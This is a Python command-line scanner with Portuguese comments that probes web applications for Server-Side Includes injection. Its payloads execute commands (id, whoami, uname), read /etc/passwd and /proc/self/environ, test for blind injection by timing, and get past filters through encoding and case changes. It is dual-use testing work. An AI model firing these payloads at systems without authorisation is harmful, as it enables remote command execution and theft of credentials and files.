#!/usr/bin/env python3
"""Modulo de deteccao de Server-Side Includes (SSI) Injection.

Testa se o servidor e vulneravel a injecao SSI via:
  - RCE — execucao de comandos via <!--#exec cmd="..."-->
  - File read — leitura de arquivos via <!--#include file="..."-->
  - Blind — SSI cego via timing ou diferencas de resposta
  - Bypass — encoding e variantes para contornar filtros

Fluxo:
  1. Envia payloads SSI em parametros de entrada
  2. Verifica se a resposta indica execucao bem-sucedida
  3. Se detectado, envia payloads de exploit (whoami, id, passwd)
  4. Classifica: detectado, blocked, error
  5. Retorna resultado consolidado com severidade
"""

import argparse
import logging
import re
import time
from dataclasses import asdict, dataclass

import httpx

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_async_client,
    create_banner,
    init_scanner,
    print_exploit_info,
    print_json,
    run_concurrent,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)

logger = logging.getLogger("mytools.ssiinject")

_CATEGORY_MAP: dict[str, list[str]] = {
    "detect": [
        "basic_echo",
        "basic_exec",
        "basic_include",
        "basic_config",
        "basic_printenv",
    ],
    "rce": ["exec_whoami", "exec_id", "exec_ls", "exec_cat", "exec_uname"],
    "file_read": [
        "include_passwd",
        "include_hosts",
        "include_etc",
        "include_proc",
        "include_iis",
    ],
    "blind": ["blind_sleep", "blind_expr", "blind_len", "blind_md5", "blind_hash"],
    "bypass": ["url_encode", "double_encode", "null_byte", "case_variation", "nesting"],
}

_DETECT_PAYLOADS: list[tuple[str, str, list[str]]] = [
    (
        "basic_echo",
        '<!--#echo var="DOCUMENT_ROOT"-->',
        ["var=", "DOCUMENT_ROOT", "/var/www", "/home"],
    ),
    (
        "basic_exec",
        '<!--#exec cmd="id"-->',
        ["uid=", "gid=", "groups="],
    ),
    (
        "basic_include",
        '<!--#include file="/etc/passwd"-->',
        ["root:", "/bin/bash", "/bin/sh"],
    ),
    (
        "basic_config",
        '<!--#config timefmt="%s"-->',
        ["config", "timefmt"],
    ),
    (
        "basic_printenv",
        "<!--#printenv-->",
        ["DOCUMENT_ROOT", "SERVER_NAME", "SCRIPT_NAME", "REQUEST_URI"],
    ),
]

_RCE_PAYLOADS: list[tuple[str, str, list[str]]] = [
    (
        "exec_whoami",
        '<!--#exec cmd="whoami"-->',
        ["www-data", "apache", "nginx", "root", "nobody"],
    ),
    (
        "exec_id",
        '<!--#exec cmd="id"-->',
        ["uid=", "gid=", "groups="],
    ),
    (
        "exec_ls",
        '<!--#exec cmd="ls /"-->',
        ["bin", "etc", "home", "var", "usr"],
    ),
    (
        "exec_cat",
        '<!--#exec cmd="cat /etc/hostname"-->',
        ["hostname", "localhost"],
    ),
    (
        "exec_uname",
        '<!--#exec cmd="uname -a"-->',
        ["linux", "Linux", "GNU", "kernel"],
    ),
]

_FILE_READ_PAYLOADS: list[tuple[str, str, list[str]]] = [
    (
        "include_passwd",
        '<!--#include file="/etc/passwd"-->',
        ["root:", "daemon:", "/bin/bash"],
    ),
    (
        "include_hosts",
        '<!--#include file="/etc/hosts"-->',
        ["localhost", "127.0.0.1"],
    ),
    (
        "include_etc",
        '<!--#exec cmd="cat /etc/passwd"-->',
        ["root:", "daemon:", "/bin/bash"],
    ),
    (
        "include_proc",
        '<!--#exec cmd="cat /proc/self/environ"-->',
        ["PATH=", "SERVER_NAME=", "DOCUMENT_ROOT="],
    ),
    (
        "include_iis",
        '<!--#include file="C:\\Windows\\win.ini"-->',
        ["[fonts]", "[extensions]"],
    ),
]

_BLIND_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
    (
        "blind_sleep",
        '<!--#exec cmd="sleep 2"-->',
        "time",
        ["response"],
    ),
    (
        "blind_expr",
        '<!--#exec cmd="expr 1 + 1"-->',
        "content",
        ["2"],
    ),
    (
        "blind_len",
        '<!--#exec cmd="echo -n abc | wc -c"-->',
        "content",
        ["3"],
    ),
    (
        "blind_md5",
        '<!--#exec cmd="echo -n test | md5sum"-->',
        "content",
        ["098f6bcd4621d373cade4e832627b4f6"],
    ),
    (
        "blind_hash",
        '<!--#exec cmd="echo test | sha1sum"-->',
        "content",
        ["a94a8fe5ccb19ba61c4c0873d391e987982fbbd3"],
    ),
]

_BYPASS_PAYLOADS: list[tuple[str, str, list[str]]] = [
    (
        "url_encode",
        "%3C!--%23exec%20cmd%3D%22id%22--%3E",
        ["uid=", "gid="],
    ),
    (
        "double_encode",
        "%253C!--%2523exec%2520cmd%253D%2522id%2522--%253E",
        ["uid=", "gid="],
    ),
    (
        "null_byte",
        '<!--#exec cmd="id"%00-->',
        ["uid=", "gid="],
    ),
    (
        "case_variation",
        '<!--#EXEC CMD="id"-->',
        ["uid=", "gid="],
    ),
    (
        "nesting",
        '<!--#exec cmd="cat /etc/passwd" -->',
        ["root:", "/bin/bash"],
    ),
]

_SSI_PARAMS: list[str] = [
    "user",
    "username",
    "search",
    "comment",
    "name",
    "query",
    "input",
    "text",
    "message",
    "data",
    "page",
    "file",
    "path",
    "template",
    "include",
]


@dataclass(frozen=True, slots=True)
class SSIiAttempt:
    """Tentativa individual de SSI Injection."""

    technique: str
    category: str
    payload: str
    param: str
    method: str
    status_baseline: int
    status_test: int
    size_baseline: int
    size_test: int
    status_changed: bool
    size_changed: bool
    vulnerable: bool
    details: str
    error: str
    exploit: str = ""
    tool: str = ""


@dataclass(frozen=True, slots=True)
class SSIiResult:
    """Resultado consolidado do scan de SSI Injection."""

    target: str
    baseline_status: int
    baseline_size: int
    tls: bool
    attempts: list[SSIiAttempt]
    vulnerable_techniques: list[str]
    blocked_techniques: list[str]
    issues: list[str]
    overall_status: str


async def _test_baseline(client: httpx.AsyncClient, url: str) -> tuple[int, int, bytes]:
    """Envia requisicao baseline para obter resposta de referencia."""
    try:
        resp = await client.get(url, follow_redirects=False)
        return resp.status_code, len(resp.content), resp.content
    except httpx.RequestError:
        return 0, 0, b""


def _check_ssi_response(
    body: bytes,
    status: int,
    indicators: list[str],
) -> bool:
    """Verifica se a resposta indica SSI injection bem-sucedido.

    Indicadores compostos apenas por palavras/digitos ("2", "3", "uid")
    casam com word-boundary para nao acusar substring de numeros/palavras
    maiores. Indicadores com pontuacao ou hashes unicos usam substring.
    """
    text = body.decode("utf-8", errors="ignore").lower()
    if status == 0:
        return False
    for indicator in indicators:
        ind = indicator.lower()
        if re.fullmatch(r"\w+", ind) and len(ind) < 16:
            if re.search(rf"\b{re.escape(ind)}\b", text):
                return True
        elif ind in text:
            return True
    return False


async def _test_detect(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[SSIiAttempt]:
    """Testa SSI injection basico com payloads de deteccao."""
    attempts: list[SSIiAttempt] = []
    b_status, b_size, _ = baseline

    for technique, payload, indicators in _DETECT_PAYLOADS:
        for param in _SSI_PARAMS[:6]:
            for method in ("post_form", "query"):
                try:
                    if method == "post_form":
                        resp = await client.post(
                            base_url,
                            data={param: payload},
                            follow_redirects=False,
                        )
                    else:
                        resp = await client.get(
                            base_url,
                            params={param: payload},
                            follow_redirects=False,
                        )

                    t_status = resp.status_code
                    t_size = len(resp.content)
                    status_changed = t_status != b_status
                    vulnerable = _check_ssi_response(resp.content, t_status, indicators)

                    attempts.append(
                        SSIiAttempt(
                            technique=f"{technique}_{param}",
                            category="detect",
                            payload=payload,
                            param=param,
                            method=method,
                            status_baseline=b_status,
                            status_test=t_status,
                            size_baseline=b_size,
                            size_test=t_size,
                            status_changed=status_changed,
                            size_changed=abs(t_size - b_size) > 50,
                            vulnerable=vulnerable,
                            details=f"Status {b_status}->{t_status}"
                            if status_changed
                            else "Sem mudanca",
                            error="",
                            exploit="<!--#exec cmd='id'-->" if vulnerable else "",
                            tool="curl",
                        )
                    )
                except httpx.RequestError as exc:
                    attempts.append(
                        SSIiAttempt(
                            technique=f"{technique}_{param}",
                            category="detect",
                            payload=payload,
                            param=param,
                            method=method,
                            status_baseline=b_status,
                            status_test=0,
                            size_baseline=b_size,
                            size_test=0,
                            status_changed=False,
                            size_changed=False,
                            vulnerable=False,
                            details="",
                            error=str(exc),
                        )
                    )

    return attempts


async def _test_rce(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[SSIiAttempt]:
    """Testa RCE via SSI."""
    attempts: list[SSIiAttempt] = []
    b_status, b_size, _ = baseline

    for technique, payload, indicators in _RCE_PAYLOADS:
        for param in _SSI_PARAMS[:6]:
            for method in ("post_form", "query"):
                try:
                    if method == "post_form":
                        resp = await client.post(
                            base_url,
                            data={param: payload},
                            follow_redirects=False,
                        )
                    else:
                        resp = await client.get(
                            base_url,
                            params={param: payload},
                            follow_redirects=False,
                        )

                    t_status = resp.status_code
                    t_size = len(resp.content)
                    status_changed = t_status != b_status
                    vulnerable = _check_ssi_response(resp.content, t_status, indicators)

                    attempts.append(
                        SSIiAttempt(
                            technique=f"{technique}_{param}",
                            category="rce",
                            payload=payload,
                            param=param,
                            method=method,
                            status_baseline=b_status,
                            status_test=t_status,
                            size_baseline=b_size,
                            size_test=t_size,
                            status_changed=status_changed,
                            size_changed=abs(t_size - b_size) > 50,
                            vulnerable=vulnerable,
                            details=f"Status {b_status}->{t_status}"
                            if status_changed
                            else "Sem mudanca",
                            error="",
                            exploit="<!--#exec cmd='id'-->" if vulnerable else "",
                            tool="curl",
                        )
                    )
                except httpx.RequestError as exc:
                    attempts.append(
                        SSIiAttempt(
                            technique=f"{technique}_{param}",
                            category="rce",
                            payload=payload,
                            param=param,
                            method=method,
                            status_baseline=b_status,
                            status_test=0,
                            size_baseline=b_size,
                            size_test=0,
                            status_changed=False,
                            size_changed=False,
                            vulnerable=False,
                            details="",
                            error=str(exc),
                        )
                    )

    return attempts


async def _test_file_read(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[SSIiAttempt]:
    """Testa file read via SSI."""
    attempts: list[SSIiAttempt] = []
    b_status, b_size, _ = baseline

    for technique, payload, indicators in _FILE_READ_PAYLOADS:
        for param in _SSI_PARAMS[:6]:
            for method in ("post_form", "query"):
                try:
                    if method == "post_form":
                        resp = await client.post(
                            base_url,
                            data={param: payload},
                            follow_redirects=False,
                        )
                    else:
                        resp = await client.get(
                            base_url,
                            params={param: payload},
                            follow_redirects=False,
                        )

                    t_status = resp.status_code
                    t_size = len(resp.content)
                    status_changed = t_status != b_status
                    vulnerable = _check_ssi_response(resp.content, t_status, indicators)

                    attempts.append(
                        SSIiAttempt(
                            technique=f"{technique}_{param}",
                            category="file_read",
                            payload=payload,
                            param=param,
                            method=method,
                            status_baseline=b_status,
                            status_test=t_status,
                            size_baseline=b_size,
                            size_test=t_size,
                            status_changed=status_changed,
                            size_changed=abs(t_size - b_size) > 50,
                            vulnerable=vulnerable,
                            details=f"Status {b_status}->{t_status}"
                            if status_changed
                            else "Sem mudanca",
                            error="",
                            exploit="<!--#exec cmd='id'-->" if vulnerable else "",
                            tool="curl",
                        )
                    )
                except httpx.RequestError as exc:
                    attempts.append(
                        SSIiAttempt(
                            technique=f"{technique}_{param}",
                            category="file_read",
                            payload=payload,
                            param=param,
                            method=method,
                            status_baseline=b_status,
                            status_test=0,
                            size_baseline=b_size,
                            size_test=0,
                            status_changed=False,
                            size_changed=False,
                            vulnerable=False,
                            details="",
                            error=str(exc),
                        )
                    )

    return attempts


async def _test_blind(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[SSIiAttempt]:
    """Testa SSI injection cega."""
    attempts: list[SSIiAttempt] = []
    b_status, b_size, _ = baseline

    for technique, payload, _check_type, indicators in _BLIND_PAYLOADS:
        for param in _SSI_PARAMS[:4]:
            try:
                b_elapsed = 0.0
                if _check_type == "time":
                    try:
                        b_start = time.monotonic()
                        await client.get(
                            base_url,
                            params={param: "a"},
                            follow_redirects=False,
                        )
                        b_elapsed = time.monotonic() - b_start
                    except httpx.RequestError:
                        b_elapsed = 0.0

                t_start = time.monotonic()
                resp = await client.get(
                    base_url,
                    params={param: payload},
                    follow_redirects=False,
                )
                t_elapsed = time.monotonic() - t_start

                t_status = resp.status_code
                t_size = len(resp.content)
                status_changed = t_status != b_status
                vulnerable = _check_ssi_response(resp.content, t_status, indicators)

                if (
                    _check_type == "time"
                    and t_elapsed >= 1.5
                    and t_elapsed >= b_elapsed + 1.0
                ):
                    vulnerable = True

                details = ""
                if _check_type == "time" and t_elapsed >= 1.5:
                    if t_elapsed >= b_elapsed + 1.0:
                        details = f"Sleep detectado: {t_elapsed:.1f}s"
                    else:
                        details = (
                            f"Sleep {t_elapsed:.1f}s < baseline {b_elapsed:.1f}s + 1.0s"
                        )
                elif status_changed:
                    details = f"Status {b_status}->{t_status}"
                else:
                    details = "Sem mudanca"

                attempts.append(
                    SSIiAttempt(
                        technique=f"{technique}_{param}",
                        category="blind",
                        payload=payload,
                        param=param,
                        method="query",
                        status_baseline=b_status,
                        status_test=t_status,
                        size_baseline=b_size,
                        size_test=t_size,
                        status_changed=status_changed,
                        size_changed=abs(t_size - b_size) > 50,
                        vulnerable=vulnerable,
                        details=details,
                        error="",
                        exploit="<!--#exec cmd='id'-->" if vulnerable else "",
                        tool="curl",
                    )
                )
            except httpx.RequestError as exc:
                attempts.append(
                    SSIiAttempt(
                        technique=f"{technique}_{param}",
                        category="blind",
                        payload=payload,
                        param=param,
                        method="query",
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(exc),
                    )
                )

    return attempts


async def _test_bypass(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[SSIiAttempt]:
    """Testa bypass de filtragem SSI."""
    attempts: list[SSIiAttempt] = []
    b_status, b_size, _ = baseline

    for technique, payload, indicators in _BYPASS_PAYLOADS:
        for param in _SSI_PARAMS[:4]:
            try:
                resp = await client.post(
                    base_url,
                    data={param: payload},
                    follow_redirects=False,
                )

                t_status = resp.status_code
                t_size = len(resp.content)
                status_changed = t_status != b_status
                vulnerable = _check_ssi_response(resp.content, t_status, indicators)

                attempts.append(
                    SSIiAttempt(
                        technique=f"{technique}_{param}",
                        category="bypass",
                        payload=payload,
                        param=param,
                        method="post_form",
                        status_baseline=b_status,
                        status_test=t_status,
                        size_baseline=b_size,
                        size_test=t_size,
                        status_changed=status_changed,
                        size_changed=abs(t_size - b_size) > 50,
                        vulnerable=vulnerable,
                        details=f"Status {b_status}->{t_status}"
                        if status_changed
                        else "Sem mudanca",
                        error="",
                        exploit="<!--#exec cmd='id'-->" if vulnerable else "",
                        tool="curl",
                    )
                )
            except httpx.RequestError as exc:
                attempts.append(
                    SSIiAttempt(
                        technique=f"{technique}_{param}",
                        category="bypass",
                        payload=payload,
                        param=param,
                        method="post_form",
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(exc),
                    )
                )

    return attempts


def print_results(result: SSIiResult) -> None:
    """Exibe os resultados do scan de SSI Injection."""
    print(color("\n" + "=" * 60, Cyber.GRAY))
    print(color("  SSI INJECTION — RESULTADOS", Cyber.CYAN, Cyber.BOLD))
    print(color("=" * 60, Cyber.GRAY))

    print(color(f"  Target:     {result.target}", Cyber.WHITE))
    print(
        color(
            f"  Baseline:   {result.baseline_status} ({result.baseline_size} bytes)",
            Cyber.GRAY,
        )
    )
    print(color(f"  Total:      {len(result.attempts)} testes realizados", Cyber.GRAY))

    vuln_techs = result.vulnerable_techniques
    if vuln_techs:
        print(
            color(
                f"\n  [!] {len(vuln_techs)} TECNICAS VULNERAVEIS", Cyber.RED, Cyber.BOLD
            )
        )
        for tech in vuln_techs[:10]:
            print(color(f"      [!] {tech}", Cyber.RED))
            a = next((a for a in result.attempts if a.technique == tech), None)
            if a:
                print_exploit_info(a.exploit, a.tool)
        print(color("\n  Severidade: ALTA", Cyber.RED, Cyber.BOLD))
    else:
        print(color("\n  [+] Nenhuma SSI Injection detectada", Cyber.GREEN, Cyber.BOLD))
        print(color("  Severidade: NENHUMA", Cyber.GREEN, Cyber.BOLD))

    issues = result.issues
    if issues:
        print(color(f"\n  Problemas ({len(issues)}):", Cyber.YELLOW, Cyber.BOLD))
        for issue in issues[:10]:
            print(color(f"      {issue}", Cyber.YELLOW))

    errors = [a for a in result.attempts if a.error]
    if errors:
        print(color(f"\n  Erros ({len(errors)}):", Cyber.GRAY))
        for e in errors[:3]:
            print(color(f"      {e.error[:80]}", Cyber.GRAY))

    print(color("=" * 60, Cyber.GRAY))


async def run_scan(
    target: str,
    categories: list[str],
    timeout: int,
    concurrency: int,
    output_file: str | None,
    verbose: bool,
    proxy: str | None = None,
    json_output: bool = False,
) -> int:
    """Executa o scan SSI Injection."""
    tls = target.startswith("https")
    client = create_async_client(timeout=timeout, proxy=proxy)
    try:
        print(color(f"\n  Conectando a {target}...", Cyber.CYAN))
        baseline = await _test_baseline(client, target)
        if baseline[0] == 0:
            print(color("  [!] Falha ao conectar no alvo", Cyber.RED))
            return 1

        print(color(f"  Baseline: {baseline[0]} ({baseline[1]} bytes)", Cyber.GRAY))

        run_categories = categories or list(_CATEGORY_MAP.keys())
        all_attempts: list[SSIiAttempt] = []

        coros = []
        for cat in run_categories:
            if cat == "detect":
                coros.append(_test_detect(client, target, baseline))
            elif cat == "rce":
                coros.append(_test_rce(client, target, baseline))
            elif cat == "file_read":
                coros.append(_test_file_read(client, target, baseline))
            elif cat == "blind":
                coros.append(_test_blind(client, target, baseline))
            elif cat == "bypass":
                coros.append(_test_bypass(client, target, baseline))

        if coros:
            results_list = await run_concurrent(coros, concurrency)
            for r in results_list:
                if isinstance(r, list):
                    all_attempts.extend(r)

        vuln_techs = [a.technique for a in all_attempts if a.vulnerable]
        blocked = [
            a.technique for a in all_attempts if not a.vulnerable and not a.error
        ]
        issues: list[str] = [
            f"VULN: {att.technique} - {att.details}"
            for att in all_attempts
            if att.vulnerable
        ]

        overall = "vulnerable" if vuln_techs else "secure"

        result = SSIiResult(
            target=target,
            baseline_status=baseline[0],
            baseline_size=baseline[1],
            tls=tls,
            attempts=all_attempts,
            vulnerable_techniques=vuln_techs,
            blocked_techniques=blocked,
            issues=issues,
            overall_status=overall,
        )

        if json_output:
            print_json(asdict(result))
        else:
            print_results(result)

        if output_file:
            write_output(output_file, asdict(result))

        logger.info(
            "SSI scan concluido: %d testes, %d vulneraveis",
            len(all_attempts),
            len(vuln_techs),
        )
        return 1 if vuln_techs else 0

    finally:
        await client.aclose()


banner_art = create_banner(
    r"""
     _____ _____  _____   ______             ______           _     _  _
    / ____/ ____||  __ \ / ___ \           | ___ \         | |   | || |
    \___ \| (___ | |  | | |_/ / __ _  __ _| |_/ / __ _  __| | __| || |_
    ____) |___ \ | |  | | ___ \/ _` |/ _` |    / / _` |/ _` |/ _` | __|
    |_____/_____/ |_|  |_||   |\__,_|\__, \|\ \ (_| | (_| | (_| | |_
                                   __/ |  \_\__,_|\__,_|\__,_|\__|
                                  |___/
    """,
    "SSI Injection — detecta Server-Side Includes em web apps",
)


def build_parser() -> argparse.ArgumentParser:
    """Constrói o parser de argumentos CLI."""
    parser = argparse.ArgumentParser(
        prog="mytools-ssiinject",
        description="SSI Injection — detecta Server-Side Includes em web apps",
    )
    parser.add_argument("url", help="URL alvo (ex: https://example.com)")
    parser.add_argument(
        "-c",
        "--category",
        choices=list(_CATEGORY_MAP.keys()),
        help="Categoria de testes (default: todas)",
    )
    parser.add_argument(
        "--concurrency",
        type=int,
        default=5,
        help="Requisicoes simultaneas (default: 5)",
    )
    add_common_args(parser, "web")
    return parser


def run_once(args: argparse.Namespace) -> int:
    """Executa um scan SSI Injection a partir de argumentos parseados."""
    init_scanner(args)
    logger.info("SSI scan iniciado para %s", args.url)
    categories: list[str] = []
    if getattr(args, "category", None):
        categories = [args.category]
    return safe_asyncio_run(
        run_scan(
            target=args.url,
            categories=categories,
            timeout=getattr(args, "timeout", 10),
            concurrency=getattr(args, "concurrency", 5),
            output_file=getattr(args, "output", None),
            verbose=getattr(args, "verbose", False),
            proxy=getattr(args, "proxy", None),
            json_output=getattr(args, "json_output", False),
        ),
    )


def main() -> int:
    """Ponto de entrada principal."""
    return run_main_loop(
        parser=build_parser(),
        banner_fn=banner_art,
        run_fn=run_once,
        has_target=lambda a: bool(
            getattr(a, "url", None) or getattr(a, "target", None)
        ),
        prompt="ssi> ",
        description="SSI Injection interativo.",
        example="https://target.com -c detect",
        contextual_help=(
            "Uso: <url> [opcoes]\n"
            "Exemplos:\n"
            "  https://target.com\n"
            "  https://target.com -c detect\n"
            "  https://target.com -c rce\n"
            "  https://target.com -c bypass --proxy http://127.0.0.1:8080"
        ),
    )


if __name__ == "__main__":
    raise SystemExit(main())
